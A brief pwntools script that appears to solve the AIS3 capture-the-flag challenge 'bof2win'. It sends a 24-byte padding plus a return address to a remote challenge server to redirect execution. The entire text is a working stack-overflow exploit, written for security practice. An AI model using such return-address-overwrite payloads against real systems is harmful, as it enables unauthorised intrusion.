from pwn import *

#r = process("./bof2win/share/bof2win")
r = remote("chals1.ais3.org", 12347)
#r = remote("0.0.0.0", 12347)


r.recvline()

payload = "A"*24+p64(0x40121B)
#raw_input()
r.sendline(payload)
#raw_input()
r.interactive()
